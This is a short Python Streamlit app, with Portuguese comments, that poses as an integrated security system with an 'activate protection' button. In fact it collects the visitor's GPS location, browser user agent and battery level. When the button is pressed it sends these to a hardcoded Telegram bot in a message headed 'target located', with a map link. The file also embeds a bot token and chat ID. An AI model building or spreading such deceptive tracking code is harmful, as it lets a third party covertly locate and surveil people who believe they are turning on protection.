import streamlit as st
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try: requests.post(url, json=payload)
    except: pass

# 2. CONFIGURAÇÃO DA PÁGINA
st.set_page_config(page_title="Sistema de Segurança Integrado", page_icon="🔐", layout="centered")

# 3. VISUAL E ANIMAÇÃO DA ESFERA VERDE
st.markdown("""
    <style>
    .main { background-color: #0d1117; color: white; }
    
    /* Título e Escudo */
    .header-container { text-align: center; margin-bottom: 20px; }
    .shield-icon { font-size: 50px; margin-bottom: 10px; }
    
    /* Esfera de Energia Verde */
    .sphere-container {
        display: flex; justify-content: center; align-items: center; margin: 30px 0;
    }
    .green-sphere {
        width: 180px; height: 180px;
        background: radial-gradient(circle, #2ecc71 0%, #27ae60 40%, #000 75%);
        border-radius: 50%;
        box-shadow: 0 0 30px #2ecc71, inset 0 0 50px #2ecc71;
        animation: pulse 2s infinite ease-in-out;
        display: flex; justify-content: center; align-items: center;
        border: 1px solid rgba(46, 204, 113, 0.3);
    }
    @keyframes pulse {
        0% { transform: scale(0.95); box-shadow: 0 0 20px #2ecc71; opacity: 0.8; }
        50% { transform: scale(1.05); box-shadow: 0 0 50px #2ecc71; opacity: 1; }
        100% { transform: scale(0.95); box-shadow: 0 0 20px #2ecc71; opacity: 0.8; }
    }

    /* Botão Ativar Proteção */
    div.stButton > button {
        background-color: #ffc107 !important;
        color: black !important;
        font-weight: bold !important;
        width: 100%; height: 4em; border-radius: 12px;
        border: none !important; font-size: 18px !important;
    }
    
    /* Rodapé Miamy */
    .footer {
        text-align: center; color: #555; font-size: 13px;
        margin-top: 60px; font-weight: bold; letter-spacing: 1px;
    }
    </style>

    <div class="header-container">
        <div class="shield-icon">🛡️</div>
        <h1 style='color: #ffc107; margin:0;'>SEGURANÇA ATIVA</h1>
        <p style='color: #ccc;'>Monitoramento em Tempo Real</p>
    </div>

    <div class="sphere-container">
        <div class="green-sphere">
            <div style="font-size: 40px;">✨</div>
        </div>
    </div>
    """, unsafe_allow_html=True)

# 4. CAPTURA DE DADOS
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='ua')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='bat')
loc = get_geolocation()

# 5. LÓGICA DO BOTÃO
if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc and 'coords' in loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🔔 ALVO LOCALIZADO!\n\n"
            f"📱 Aparelho: {ua[:50]}... \n"
            f"🔋 Bateria: {bat if bat else '--'}%\n"
            f"📍 Mapa: [ABRIR LOCALIZAÇÃO]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("✅ Localização Enviada ao Telegram!")
        st.balloons()
    else:
        st.warning("🛰️ Carregando sinal de satélite... Clique novamente em 2 segundos.")

# 6. ASSINATURA FINAL
st.markdown('<p class="footer">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
